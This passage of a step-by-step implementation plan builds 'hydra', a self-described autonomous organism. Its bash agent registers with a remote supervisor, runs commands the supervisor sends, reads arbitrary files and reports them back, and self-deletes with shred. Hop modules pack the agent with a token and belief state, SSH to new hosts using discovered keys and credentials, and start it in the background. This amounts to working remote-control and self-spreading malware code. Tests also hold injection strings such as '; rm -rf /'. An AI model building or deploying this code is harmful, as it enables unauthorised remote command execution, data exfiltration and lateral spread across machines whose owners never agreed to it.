  # $1=cmd  $2=timeout_s
  local cmd="$1" t="$2"
  local out_file err_file start end exit_code
  out_file=$(mktemp); err_file=$(mktemp)
  start=$(date +%s%3N 2>/dev/null || python3 -c 'import time;print(int(time.time()*1000))')
  timeout "$t" bash -c "$cmd" >"$out_file" 2>"$err_file"; exit_code=$?
  end=$(date +%s%3N 2>/dev/null || python3 -c 'import time;print(int(time.time()*1000))')
  local stdout_json stderr_json
  stdout_json=$(hydra_json_escape <"$out_file")
  stderr_json=$(hydra_json_escape <"$err_file")
  rm -f "$out_file" "$err_file"
  printf '{"stdout":%s,"stderr":%s,"exit_code":%d,"wall_ms":%d}' \
    "$stdout_json" "$stderr_json" "$exit_code" "$((end - start))"
}

hydra_read_file() {
  # $1=path  $2=max_bytes  $3=scope (home|any)
  local path="$1" max="$2" scope="$3"
  if [ "$scope" = "home" ]; then
    case "$path" in
      "$HYDRA_HOME"/*) ;;
      *) printf '{"err":"policy","reason":"path-outside-home"}'; return 1 ;;
    esac
  fi
  if [ ! -r "$path" ]; then
    printf '{"err":"unreadable"}'; return 1
  fi
  local size truncated content_b64
  size=$(stat -c '%s' "$path" 2>/dev/null || stat -f '%z' "$path")
  if [ "$size" -gt "$max" ]; then truncated=true; else truncated=false; fi
  content_b64=$(head -c "$max" "$path" | base64 -w 0 2>/dev/null || head -c "$max" "$path" | base64)
  printf '{"size":%d,"truncated":%s,"content_b64":"%s"}' "$size" "$truncated" "$content_b64"
}

hydra_register() {
  # $1=supervisor_url  $2=mission_id  $3=fingerprint  $4=platform  $5=version
  curl -fsS -X POST "$1/v1/register" \
    -H 'Content-Type: application/json' \
    -d "{\"mission_id\":\"$2\",\"fingerprint\":\"$3\",\"platform\":\"$4\",\"version\":\"$5\"}"
}

hydra_poll() {
  # $1=supervisor_url  $2=mission_id  $3=session_key  $4=last_op_id
  local ts sig path
  ts=$(date +%s)
  path="/v1/poll?mission=$2"
  sig=$(hydra_hmac_hex "$3" 'GET' "$path" '' "$ts")
  curl -fsS "$1$path" -H "X-Hydra-Sig: $sig" -H "X-Hydra-Ts: $ts"
}

hydra_report() {
  # $1=supervisor_url  $2=mission_id  $3=session_key  $4=op_id  $5=ok(true|false)  $6=payload_inline_json
  local ts sig body
  ts=$(date +%s)
  body="{\"mission_id\":\"$2\",\"op_id\":\"$4\",\"ok\":$5,\"data\":$6,\"wall_ms\":0}"
  sig=$(hydra_hmac_hex "$3" 'POST' '/v1/report' "$body" "$ts")
  curl -fsS -X POST "$1/v1/report" \
    -H "X-Hydra-Sig: $sig" -H "X-Hydra-Ts: $ts" -H 'Content-Type: application/json' \
    -d "$body"
}

hydra_terminate() {
  rm -rf "$HYDRA_HOME" 2>/dev/null
  shred -u "$0" 2>/dev/null || rm -f "$0"
  exit 0
}
```

- [ ] **Step 4: Run test to verify it passes**

```bash
docker run --rm -v "$(pwd)/script:/s" -w /s alpine:3.20 sh -c \
  "apk add --no-cache bats bash coreutils python3 >/dev/null && bats test/primitives_bats.bats"
```

Expected: PASS, 4 tests.

- [ ] **Step 5: Commit**

```bash
git add script/lib/primitives.sh script/test/primitives_bats.bats
git commit -m "feat(script): six primitives — register/poll/exec/read/report/terminate"
```

---

### Task 32: Self-guards (lib/guards.sh)

**Files:**
- Create: `script/lib/guards.sh`
- Create: `script/test/guards_bats.bats`

- [ ] **Step 1: Write the failing test**

`script/test/guards_bats.bats`:

```bash
#!/usr/bin/env bats

load '../lib/guards.sh'

@test "hydra_assert_no_listen passes when no listen sockets opened by us" {
  run hydra_assert_no_listen
  [ "$status" -eq 0 ]
}

@test "hydra_refuse_sudo blocks sudo invocation" {
  run hydra_check_cmd 'sudo ls'
  [ "$status" -ne 0 ]
}

@test "hydra_refuse_sudo allows non-sudo invocation" {
  run hydra_check_cmd 'echo hi'
  [ "$status" -eq 0 ]
}

@test "hydra_refuse_write_outside blocks write outside HYDRA_HOME" {
  export HYDRA_HOME=/tmp/h_$$
  mkdir -p "$HYDRA_HOME"
  run hydra_assert_path_in_home '/etc/passwd' 'write'
  [ "$status" -ne 0 ]
  run hydra_assert_path_in_home "$HYDRA_HOME/file" 'write'
  [ "$status" -eq 0 ]
}
```

- [ ] **Step 2: Run test to verify it fails**

```bash
docker run --rm -v "$(pwd)/script:/s" -w /s alpine:3.20 sh -c \
  "apk add --no-cache bats bash >/dev/null && bats test/guards_bats.bats"
```

Expected: FAIL.

- [ ] **Step 3: Write minimal implementation**

`script/lib/guards.sh`:

```bash
hydra_check_cmd() {
  case "$1" in
    *sudo\ *|sudo) return 1 ;;
  esac
  return 0
}

hydra_assert_path_in_home() {
  case "$1" in
    "$HYDRA_HOME"/*) return 0 ;;
    *) return 1 ;;
  esac
}

hydra_assert_no_listen() {
  if command -v ss >/dev/null 2>&1; then
    if ss -tlnp 2>/dev/null | grep -q "pid=$$"; then return 1; fi
  fi
  return 0
}
```

- [ ] **Step 4: Run test to verify it passes**

```bash
docker run --rm -v "$(pwd)/script:/s" -w /s alpine:3.20 sh -c \
  "apk add --no-cache bats bash iproute2 >/dev/null && bats test/guards_bats.bats"
```

Expected: PASS, 4 tests.

- [ ] **Step 5: Commit**

```bash
git add script/lib/guards.sh script/test/guards_bats.bats
git commit -m "feat(script): local self-guards (no-sudo, in-home, no-listen)"
```

---

### Task 33: build.sh (concatenate + line cap + shellcheck)

**Files:**
- Create: `script/build.sh`
- Create: `script/main.sh`
- Create: `tests/script-build.test.ts`

- [ ] **Step 1: Write the failing test**

`tests/script-build.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { execSync } from 'node:child_process';
import { existsSync, readFileSync, statSync } from 'node:fs';

describe('script build', () => {
  it('produces hydra.sh ≤ 200 lines and shellcheck-clean', () => {
    execSync('bash script/build.sh', { stdio: 'inherit' });
    expect(existsSync('script/hydra.sh')).toBe(true);
    const content = readFileSync('script/hydra.sh', 'utf8');
    const lines = content.split('\n').filter(l => !/^\s*#/.test(l) && l.trim().length > 0);
    expect(lines.length).toBeLessThanOrEqual(200);
    expect(statSync('script/hydra.sh').mode & 0o111).toBeGreaterThan(0);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

```bash
npx vitest run tests/script-build.test.ts
```

Expected: FAIL — `script/build.sh` doesn't exist.

- [ ] **Step 3: Write minimal implementation**

`script/main.sh`:

```bash
#!/usr/bin/env bash
# hydra.sh — autonomous goal-seeking organism (script half).
# License: see repository LICENSE.
set -eu

SUPERVISOR_URL='__SUPERVISOR_URL__'
EMBEDDED_TOKEN_MASKED='__MASKED_TOKEN_HEX__'
EMBEDDED_TOKEN_SALT='__SALT__'
MISSION_ID='__MISSION_ID__'
HYDRA_VERSION='0.1.0'

hydra_main() {
  local platform fp token session_key resp d op id sleep_s cmd t result body
  platform=$(hydra_detect_platform)
  fp=$(hydra_fingerprint)
  token=$(hydra_unmask_token "$EMBEDDED_TOKEN_MASKED" "$fp" "$EMBEDDED_TOKEN_SALT")

  hydra_init_home "$MISSION_ID"

  resp=$(hydra_register "$SUPERVISOR_URL" "$MISSION_ID" "$fp" "$platform" "$HYDRA_VERSION") || exit 0
  session_key=$(printf '%s' "$resp" | grep -oE '"session_key":"[^"]+"' | cut -d'"' -f4)
  [ -n "$session_key" ] || exit 0

  while true; do
    d=$(hydra_poll "$SUPERVISOR_URL" "$MISSION_ID" "$session_key" '' || true)
    [ -n "$d" ] || { sleep 5; continue; }
    op=$(printf '%s' "$d" | grep -oE '"op":"[^"]+"' | cut -d'"' -f4)
    id=$(printf '%s' "$d" | grep -oE '"id":"[^"]+"' | cut -d'"' -f4)
    case "$op" in
      yield)
        sleep_s=$(printf '%s' "$d" | grep -oE '"sleep_s":[0-9]+' | cut -d: -f2)
        sleep "${sleep_s:-5}"
        ;;
      exec)
        cmd=$(printf '%s' "$d" | python3 -c "import json,sys;print(json.load(sys.stdin)['cmd'])")
        t=$(printf '%s' "$d" | grep -oE '"timeout_s":[0-9]+' | cut -d: -f2)
        hydra_check_cmd "$cmd" || { hydra_report "$SUPERVISOR_URL" "$MISSION_ID" "$session_key" "$id" false '{"err":"policy"}'; continue; }
        result=$(hydra_exec_cmd "$cmd" "${t:-30}")
        hydra_report "$SUPERVISOR_URL" "$MISSION_ID" "$session_key" "$id" true "$result"
        ;;
      read)
        path=$(printf '%s' "$d" | python3 -c "import json,sys;print(json.load(sys.stdin)['path'])")
        m=$(printf '%s' "$d" | grep -oE '"max_bytes":[0-9]+' | cut -d: -f2)
        result=$(hydra_read_file "$path" "${m:-4096}" 'any')
        hydra_report "$SUPERVISOR_URL" "$MISSION_ID" "$session_key" "$id" true "$result"
        ;;
      terminate)
        hydra_terminate
        ;;
      *)
        sleep 5
        ;;
    esac
  done
}

hydra_main
```

`script/build.sh`:

```bash
#!/usr/bin/env bash
set -eu
cd "$(dirname "$0")"

OUT=hydra.sh
{
  echo '#!/usr/bin/env bash'
  echo '# AUTO-GENERATED by build.sh — DO NOT EDIT.'
  cat lib/boot.sh lib/hmac.sh lib/primitives.sh lib/guards.sh main.sh \
    | grep -vE '^#!/usr/bin/env bash$'
} > "$OUT"
chmod +x "$OUT"

if command -v shellcheck >/dev/null 2>&1; then
  shellcheck "$OUT" || { echo "shellcheck failed"; exit 1; }
fi

# Line cap: ≤200 non-comment, non-blank lines.
NCNB=$(grep -cvE '^\s*(#|$)' "$OUT")
if [ "$NCNB" -gt 200 ]; then
  echo "ERROR: hydra.sh has $NCNB non-comment lines (cap 200)"; exit 1
fi
echo "built $OUT — $NCNB non-comment lines"
```

- [ ] **Step 4: Run test to verify it passes**

```bash
chmod +x script/build.sh
npx vitest run tests/script-build.test.ts
```

Expected: PASS. If line count > 200, refactor `main.sh` to be tighter (collapse case bodies).

- [ ] **Step 5: Commit**

```bash
git add script/main.sh script/build.sh tests/script-build.test.ts
git commit -m "feat(script): build pipeline (concat + shellcheck + 200-line cap)"
```

---

### Task 34: Cross-platform container test (Linux Alpine + WSL Ubuntu)

**Files:**
- Create: `script/test/linux.Dockerfile`
- Create: `script/test/wsl.Dockerfile`
- Create: `script/test/run-container-tests.sh`
- Create: `tests/script-container.test.ts`

- [ ] **Step 1: Write the failing test**

`tests/script-container.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { execSync } from 'node:child_process';

describe('script container test', () => {
  it('runs all bats suites in Alpine + Ubuntu containers', () => {
    const out = execSync('bash script/test/run-container-tests.sh', { encoding: 'utf8' });
    expect(out).toMatch(/all suites passed/);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

```bash
npx vitest run tests/script-container.test.ts
```

Expected: FAIL.

- [ ] **Step 3: Write minimal implementation**

`script/test/linux.Dockerfile`:

```dockerfile
FROM alpine:3.20
RUN apk add --no-cache bash openssl coreutils python3 iproute2 bats curl
WORKDIR /s
COPY . /s
CMD ["bash", "-lc", "bats test/*.bats"]
```

`script/test/wsl.Dockerfile`:

```dockerfile
FROM ubuntu:24.04
RUN apt-get update && apt-get install -y --no-install-recommends \
  bash openssl coreutils python3 iproute2 bats curl ca-certificates && rm -rf /var/lib/apt/lists/*
WORKDIR /s
COPY . /s
CMD ["bash", "-lc", "bats test/*.bats"]
```

`script/test/run-container-tests.sh`:

```bash
#!/usr/bin/env bash
set -eu
cd "$(dirname "$0")/.."

docker build -q -f test/linux.Dockerfile -t hydra-script-linux .
docker build -q -f test/wsl.Dockerfile -t hydra-script-wsl .

docker run --rm hydra-script-linux
docker run --rm hydra-script-wsl

echo "all suites passed"
```

- [ ] **Step 4: Run test to verify it passes**

```bash
chmod +x script/test/run-container-tests.sh
npx vitest run tests/script-container.test.ts
```

Expected: PASS. (macOS smoke test runs on operator's host directly: `cd script && bats test/*.bats` — documented in README, not in CI.)

- [ ] **Step 5: Commit**

```bash
git add script/test/ tests/script-container.test.ts
git commit -m "test(script): Linux Alpine + Ubuntu (WSL) container test harness"
```

---

## Phase H — Hop (Tasks 35–39)

### Task 35: Warm packet distillation

**Files:**
- Create: `src/hop/distill.ts`
- Create: `tests/hop/distill.test.ts`

- [ ] **Step 1: Write the failing test**

`tests/hop/distill.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { distillWarmPacket } from '../../src/hop/distill';
import { newHypothesis, addCandidate, applyObservation } from '../../src/engine/beliefs';
import type { MissionState } from '../../src/types';

const m: MissionState = {
  mission_id: 'm1', origin_fingerprint: 'fp', platform: 'linux',
  phase: 'planning', honor_tier: 'gold',
  budget_paid_usd_remaining: 10, strict_gold: true,
  wall_clock_started_ms: Date.now() - 3600_000,
  wall_clock_deadline_ms: Date.now() + 82_800_000,
  tick: 30, beliefs: {}, jump_chain: ['origin'],
  target_allowlist: ['origin', 'kvm2'],
};

describe('warm packet distillation', () => {
  it('serializes belief graph + brief + tick log + catalog ids + tier + codex pin', () => {
    let h = newHypothesis('h:target-address', 'target-address');
    h = addCandidate(h, 'kvm2', 5);
    h = applyObservation(h, { source_class: 's', note: 'n', newCandidates: [], llrByCandidate: {} }, 1);
    const packet = distillWarmPacket(
      { ...m, beliefs: { 'h:target-address': h } },
      { recentTicks: [{ tick: 30, action: 'exec', wall_ms: 5 }], catalogIds: ['ssh-config-scan'], codexHash: 'sha256:cdx' },
    );
    expect(packet.belief_graph['h:target-address']).toBeDefined();
    expect(packet.recent_ticks.length).toBe(1);
    expect(packet.catalog_ids).toContain('ssh-config-scan');
    expect(packet.honor_tier).toBe('gold');
    expect(packet.codex_hash).toBe('sha256:cdx');
    expect(packet.jump_chain_origin).toBe('m1');
  });

  it('packet is JSON-serializable and ≤ 2 MB', () => {
    const packet = distillWarmPacket(m, { recentTicks: [], catalogIds: [], codexHash: 'x' });
    const json = JSON.stringify(packet);
    expect(json.length).toBeLessThanOrEqual(2_000_000);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

```bash
npx vitest run tests/hop/distill.test.ts
```

Expected: FAIL.

- [ ] **Step 3: Write minimal implementation**

`src/hop/distill.ts`:

```typescript
import type { MissionState } from '../types';
import type { Hypothesis } from '../engine/beliefs';
import { generateBrief } from '../engine/brief';

export interface WarmPacket {
  jump_chain_origin: string;
  belief_graph: Record<string, Hypothesis>;
  brief: ReturnType<typeof generateBrief>;
  recent_ticks: { tick: number; action: string; wall_ms: number }[];
  catalog_ids: string[];
  honor_tier: 'gold' | 'silver' | 'failed';
  budget_paid_usd_remaining: number;
  wall_clock_started_ms: number;
  wall_clock_deadline_ms: number;
  target_allowlist: string[];
  codex_hash: string;
}

export interface DistillContext {
  recentTicks: { tick: number; action: string; wall_ms: number }[];
  catalogIds: string[];
  codexHash: string;
}

export function distillWarmPacket(m: MissionState, ctx: DistillContext): WarmPacket {
  return {
    jump_chain_origin: m.mission_id,
    belief_graph: m.beliefs,
    brief: generateBrief(m, { lastProgressTick: m.tick, lastProgressWallS: 0 }),
    recent_ticks: ctx.recentTicks.slice(-20),
    catalog_ids: ctx.catalogIds,
    honor_tier: m.honor_tier,
    budget_paid_usd_remaining: m.budget_paid_usd_remaining,
    wall_clock_started_ms: m.wall_clock_started_ms,
    wall_clock_deadline_ms: m.wall_clock_deadline_ms,
    target_allowlist: m.target_allowlist,
    codex_hash: ctx.codexHash,
  };
}
```

- [ ] **Step 4: Run test to verify it passes**

```bash
npx vitest run tests/hop/distill.test.ts
```

Expected: PASS, 2 tests.

- [ ] **Step 5: Commit**

```bash
git add src/hop/distill.ts tests/hop/distill.test.ts
git commit -m "feat(hop): warm packet distillation"
```

---

### Task 36: Pre-hop checklist enforcement

**Files:**
- Create: `src/hop/checklist.ts`
- Create: `tests/hop/checklist.test.ts`

- [ ] **Step 1: Write the failing test**

`tests/hop/checklist.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { enforcePreHopChecklist } from '../../src/hop/checklist';
import { distillWarmPacket } from '../../src/hop/distill';
import { newHypothesis, addCandidate, applyObservation } from '../../src/engine/beliefs';
import type { MissionState } from '../../src/types';

const m: MissionState = {
  mission_id: 'm', origin_fingerprint: 'fp', platform: 'linux',
  phase: 'planning', honor_tier: 'gold', budget_paid_usd_remaining: 10, strict_gold: true,
  wall_clock_started_ms: Date.now(), wall_clock_deadline_ms: Date.now() + 86_400_000,
  tick: 1, beliefs: {}, jump_chain: ['origin'], target_allowlist: ['origin', 'kvm2'],
};

describe('pre-hop checklist', () => {
  it('blocks when packet exceeds 2 MB', () => {
    const packet = distillWarmPacket(m, { recentTicks: [], catalogIds: [], codexHash: 'x' });
    // Inflate to > 2 MB.
    (packet as any).belief_graph['h:bogus'] = { id: 'h:bogus', candidates: Array(50_000).fill({ value: 'x'.repeat(40), logit: 0, posterior: 0, evidence: [] }) };
    const r = enforcePreHopChecklist(packet);
    expect(r.ok).toBe(false);
    expect(r.reason).toMatch(/distillation-oversize/);
  });

  it('blocks when open critical hypothesis lacks evidence in packet', () => {
    let h = newHypothesis('h:target-address', 'target-address');
    h = addCandidate(h, 'kvm2', 0);  // open, no evidence
    h = applyObservation(h, { source_class: 's', note: 'n', newCandidates: [], llrByCandidate: {} }, 1);
    const packet = distillWarmPacket({ ...m, beliefs: { 'h:target-address': h } }, { recentTicks: [], catalogIds: [], codexHash: 'x' });
    const r = enforcePreHopChecklist(packet);
    expect(r.ok).toBe(false);
    expect(r.reason).toMatch(/missing-evidence/);
  });

  it('passes when only converged hypotheses remain', () => {
    let h = newHypothesis('h:target-address', 'target-address');
    h = addCandidate(h, 'kvm2', 10);
    h = applyObservation(h, { source_class: 's', note: 'n', newCandidates: [], llrByCandidate: { kvm2: 1 } }, 1);
    let c = newHypothesis('h:target-credentials', 'target-credentials');
    c = addCandidate(c, 'k', 10);
    c = applyObservation(c, { source_class: 's', note: 'n', newCandidates: [], llrByCandidate: { k: 1 } }, 1);
    const packet = distillWarmPacket({ ...m, beliefs: { 'h:target-address': h, 'h:target-credentials': c } }, { recentTicks: [], catalogIds: [], codexHash: 'x' });
    const r = enforcePreHopChecklist(packet);
    expect(r.ok).toBe(true);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

```bash
npx vitest run tests/hop/checklist.test.ts
```

Expected: FAIL.

- [ ] **Step 3: Write minimal implementation**

`src/hop/checklist.ts`:

```typescript
import type { WarmPacket } from './distill';
import { isConverged } from '../engine/beliefs';

const MAX_PACKET_BYTES = 2_000_000;

export interface ChecklistResult {
  ok: boolean;
  reason?: string;
  details?: Record<string, unknown>;
}

export function enforcePreHopChecklist(packet: WarmPacket): ChecklistResult {
  const json = JSON.stringify(packet);
  if (json.length > MAX_PACKET_BYTES) {
    return { ok: false, reason: 'distillation-oversize', details: { bytes: json.length } };
  }
  for (const [id, h] of Object.entries(packet.belief_graph)) {
    if (!isConverged(h) && h.critical !== false) {
      const hasEvidence = h.candidates.some(c => c.evidence.length > 0);
      if (!hasEvidence) {
        return { ok: false, reason: 'missing-evidence', details: { hypothesis: id } };
      }
    }
  }
  return { ok: true };
}
```

- [ ] **Step 4: Run test to verify it passes**

```bash
npx vitest run tests/hop/checklist.test.ts
```

Expected: PASS, 3 tests.

- [ ] **Step 5: Commit**

```bash
git add src/hop/checklist.ts tests/hop/checklist.test.ts
git commit -m "feat(hop): pre-hop distillation checklist enforcement"
```

---

### Task 37: Bootstrap bundle composition

**Files:**
- Create: `src/hop/bundle.ts`
- Create: `tests/hop/bundle.test.ts`

- [ ] **Step 1: Write the failing test**

`tests/hop/bundle.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { composeBootstrapBundle, decodeBootstrapBundle } from '../../src/hop/bundle';

describe('bootstrap bundle', () => {
  it('round-trips script + token + packet', () => {
    const bundle = composeBootstrapBundle({
      hydra_sh: '#!/bin/bash\necho hi',
      masked_token_hex: 'ab'.repeat(32),
      salt: 'salt',
      mission_id: 'm_target_1',
      warm_packet: { foo: 'bar' },
      supervisor_url: 'https://w.workers.dev',
    });
    expect(typeof bundle).toBe('string');
    expect(bundle.length).toBeLessThan(2_000_000);
    const decoded = decodeBootstrapBundle(bundle);
    expect(decoded.mission_id).toBe('m_target_1');
    expect(decoded.warm_packet.foo).toBe('bar');
    expect(decoded.hydra_sh).toContain('echo hi');
  });

  it('produces a single-line base64 payload safe for SSH stdin', () => {
    const bundle = composeBootstrapBundle({
      hydra_sh: '#!/bin/bash', masked_token_hex: 'aa', salt: 's',
      mission_id: 'm', warm_packet: {}, supervisor_url: 'u',
    });
    expect(bundle).not.toContain('\n');
    expect(bundle).toMatch(/^[A-Za-z0-9+/=]+$/);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

```bash
npx vitest run tests/hop/bundle.test.ts
```

Expected: FAIL.

- [ ] **Step 3: Write minimal implementation**

`src/hop/bundle.ts`:

```typescript
export interface BundleContents {
  hydra_sh: string;
  masked_token_hex: string;
  salt: string;
  mission_id: string;
  warm_packet: unknown;
  supervisor_url: string;
}

export function composeBootstrapBundle(c: BundleContents): string {
  const json = JSON.stringify(c);
  return btoa(unescape(encodeURIComponent(json)));
}

export function decodeBootstrapBundle(b64: string): BundleContents {
  const json = decodeURIComponent(escape(atob(b64)));
  return JSON.parse(json) as BundleContents;
}
```

- [ ] **Step 4: Run test to verify it passes**

```bash
npx vitest run tests/hop/bundle.test.ts
```

Expected: PASS, 2 tests.

- [ ] **Step 5: Commit**

```bash
git add src/hop/bundle.ts tests/hop/bundle.test.ts
git commit -m "feat(hop): bootstrap bundle compose/decode (base64-packed)"
```

---

### Task 38: SSH exec directive composer

**Files:**
- Create: `src/hop/ssh.ts`
- Create: `tests/hop/ssh.test.ts`

- [ ] **Step 1: Write the failing test**

`tests/hop/ssh.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { composeSshHopExec } from '../../src/hop/ssh';

describe('SSH hop exec composer', () => {
  it('emits a single exec directive with ssh + StrictHostKeyChecking=accept-new', () => {
    const d = composeSshHopExec({
      credsPath: '/home/u/.ssh/kvm2_ed25519',
      targetUser: 'aj',
      targetHost: 'kvm2',
      bundleB64: 'AAAA',
    });
    expect(d.op).toBe('exec');
    expect(d.cmd).toMatch(/ssh /);
    expect(d.cmd).toMatch(/StrictHostKeyChecking=accept-new/);
    expect(d.cmd).toMatch(/ConnectTimeout=10/);
    expect(d.cmd).toMatch(/BatchMode=yes/);
    expect(d.cmd).toContain('aj@kvm2');
    expect(d.cmd).toContain('AAAA');
    expect(d.timeout_s).toBeGreaterThanOrEqual(60);
  });

  it('rejects creds path with shell metacharacters', () => {
    expect(() => composeSshHopExec({
      credsPath: '/tmp/k; rm -rf /',
      targetUser: 'aj', targetHost: 'kvm2', bundleB64: 'AAAA',
    })).toThrow();
  });

  it('rejects target user with backticks', () => {
    expect(() => composeSshHopExec({
      credsPath: '/k', targetUser: 'aj`whoami`', targetHost: 'kvm2', bundleB64: 'A',
    })).toThrow();
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

```bash
npx vitest run tests/hop/ssh.test.ts
```

Expected: FAIL.

- [ ] **Step 3: Write minimal implementation**

`src/hop/ssh.ts`:

```typescript
import type { ExecDirective } from '../types';

export interface SshHopParams {
  credsPath: string;
  targetUser: string;
  targetHost: string;
  bundleB64: string;
}

const SAFE_PATH = /^[A-Za-z0-9_./-]+$/;
const SAFE_USER = /^[A-Za-z_][A-Za-z0-9_-]*$/;
const SAFE_HOST = /^[A-Za-z0-9._-]+$/;
const SAFE_B64 = /^[A-Za-z0-9+/=]+$/;

export function composeSshHopExec(p: SshHopParams): ExecDirective {
  if (!SAFE_PATH.test(p.credsPath)) throw new Error(`unsafe credsPath: ${p.credsPath}`);
  if (!SAFE_USER.test(p.targetUser)) throw new Error(`unsafe targetUser: ${p.targetUser}`);
  if (!SAFE_HOST.test(p.targetHost)) throw new Error(`unsafe targetHost: ${p.targetHost}`);
  if (!SAFE_B64.test(p.bundleB64)) throw new Error('unsafe bundleB64');

  const remoteBootstrap = [
    `set -eu`,
    `tmp=$(mktemp -d)`,
    `cd "$tmp"`,
    `echo '${p.bundleB64}' | base64 -d > bundle.json`,
    // Extract hydra_sh and run it (the script reads its own embedded constants from the JSON via env).
    `python3 -c "import json,sys,os; d=json.load(open('bundle.json')); open('h.sh','w').write(d['hydra_sh']); os.chmod('h.sh',0o755); print(d['mission_id'])" > mission.id`,
    `MISSION_ID=$(cat mission.id) HYDRA_BUNDLE_PATH="$tmp/bundle.json" ./h.sh </dev/null >/dev/null 2>&1 &`,
    `disown`,
  ].join(' && ');

  const cmd = `ssh -i ${p.credsPath} -o StrictHostKeyChecking=accept-new -o ConnectTimeout=10 -o BatchMode=yes ${p.targetUser}@${p.targetHost} ${JSON.stringify(remoteBootstrap)}`;

  return {
    id: `op_hop_${crypto.randomUUID().slice(0, 8)}`,
    op: 'exec', cmd, timeout_s: 60,
  };
}
```

- [ ] **Step 4: Run test to verify it passes**

```bash
npx vitest run tests/hop/ssh.test.ts
```

Expected: PASS, 3 tests.

- [ ] **Step 5: Commit**

```bash
git add src/hop/ssh.ts tests/hop/ssh.test.ts
git commit -m "feat(hop): SSH hop exec composer (sanitized inputs, accept-new)"
```

---

### Task 39: Rehydration handler on /register

**Files:**
- Modify: `src/endpoints/register.ts` (accept resume_packet)
- Create: `tests/hop/rehydrate.test.ts`

- [ ] **Step 1: Write the failing test**

`tests/hop/rehydrate.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { SELF, env } from 'cloudflare:test';
import { distillWarmPacket } from '../../src/hop/distill';
import type { MissionState } from '../../src/types';

describe('rehydration', () => {
  it('register with resume_packet creates a linked target mission', async () => {
    const originState: MissionState = {
      mission_id: 'm_origin', origin_fingerprint: 'fp_o', platform: 'linux',
      phase: 'executing-hop', honor_tier: 'gold',
      budget_paid_usd_remaining: 9.5, strict_gold: true,
      wall_clock_started_ms: Date.now() - 3600_000,
      wall_clock_deadline_ms: Date.now() + 82_800_000,
      tick: 50, beliefs: {}, jump_chain: ['m_origin'],
      target_allowlist: ['origin', 'kvm2'],
    };
    const packet = distillWarmPacket(originState, { recentTicks: [], catalogIds: [], codexHash: 'x' });
    const packetB64 = btoa(JSON.stringify(packet));

    // First, start the target mission slot via admin.
    const start = await SELF.fetch('https://h/v1/admin/mission/start', {
      method: 'POST', headers: { 'X-Admin-Key': 'dev-admin' },
      body: JSON.stringify({
        fingerprint_expected: 'fp_target', target_allowlist: ['origin', 'kvm2'],
        strict_gold: true, budget_paid_usd: 10, deadline_seconds: 82_800,
      }),
    });
    const { mission_id } = await start.json() as { mission_id: string };

    const res = await SELF.fetch('https://h/v1/register', {
      method: 'POST',
      body: JSON.stringify({
        mission_id, fingerprint: 'fp_target', platform: 'linux', version: '0.1.0',
        resume_packet: packetB64,
      }),
    });
    expect(res.status).toBe(200);
    const body = await res.json() as { mission_id: string; jump_chain: string[] };
    expect(body.jump_chain).toEqual(['m_origin', mission_id]);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

```bash
npx vitest run tests/hop/rehydrate.test.ts
```

Expected: FAIL — register doesn't accept resume_packet yet.

- [ ] **Step 3: Modify `src/endpoints/register.ts`**

Append after the fingerprint check:

```typescript
if (body.resume_packet) {
  let packet: { jump_chain_origin?: string; belief_graph?: unknown; budget_paid_usd_remaining?: number; honor_tier?: string };
  try { packet = JSON.parse(atob(body.resume_packet)); }
  catch { return new Response('bad resume_packet', { status: 400 }); }

  await stub.fetch('https://do/rehydrate', {
    method: 'POST',
    body: JSON.stringify({ packet }),
  });

  const newState = await (await stub.fetch('https://do/state')).json() as { jump_chain: string[] };
  // Continue to issue session_key as below; include jump_chain in response.
  // (Insert into the response Response.json call.)
}
```

Add corresponding `rehydrate` route to `src/mission-do.ts`:

```typescript
if (route === 'rehydrate') return this.rehydrate(req);
// ...
private async rehydrate(req: Request): Promise<Response> {
  if (!this.mission) return new Response('not initialized', { status: 404 });
  const { packet } = await req.json() as { packet: { jump_chain_origin: string; belief_graph: Record<string, unknown>; budget_paid_usd_remaining: number; honor_tier: 'gold' | 'silver' | 'failed' } };
  this.mission.beliefs = packet.belief_graph as Record<string, never>;
  this.mission.budget_paid_usd_remaining = packet.budget_paid_usd_remaining;
  this.mission.honor_tier = packet.honor_tier;
  this.mission.jump_chain = [packet.jump_chain_origin, this.mission.mission_id];
  this.mission.phase = 'verifying';
  await this.state.storage.put('mission', this.mission);
  return new Response('ok');
}
```

Update register handler response to include jump_chain:

```typescript
const stateAfter = await (await stub.fetch('https://do/state')).json() as { jump_chain: string[] };
return Response.json({
  mission_id: body.mission_id, session_key,
  poll_interval_s: 5, jump_chain: stateAfter.jump_chain,
});
```

- [ ] **Step 4: Run test to verify it passes**

```bash
npx vitest run tests/hop/rehydrate.test.ts
```

Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add src/endpoints/register.ts src/mission-do.ts tests/hop/rehydrate.test.ts
git commit -m "feat(hop): rehydration on /register accepts resume_packet"
```

---

## Phase I — Success proof (Tasks 40–41)

### Task 40: Ed25519 sign success cert

**Files:**
- Create: `src/proof/sign.ts`
- Create: `tests/proof/sign.test.ts`

- [ ] **Step 1: Write the failing test**

`tests/proof/sign.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { generateKeypair, signSuccessCert, verifySuccessCert } from '../../src/proof/sign';

describe('ed25519 success cert', () => {
  it('round-trips sign/verify', async () => {
    const { publicKeyB64, privateKey } = await generateKeypair();
    const cert = await signSuccessCert(privateKey, {
      mission_id_origin: 'm_origin', mission_id_target: 'm_target',
      target_fingerprint: 'sha256:fp', jump_chain: ['m_origin', 'm_target'],
      issued_at_ms: 1700000000_000,
    });
    const ok = await verifySuccessCert(publicKeyB64, cert);
    expect(ok).toBe(true);
  });

  it('rejects tampered cert', async () => {
    const { publicKeyB64, privateKey } = await generateKeypair();
    const cert = await signSuccessCert(privateKey, {
      mission_id_origin: 'mO', mission_id_target: 'mT',
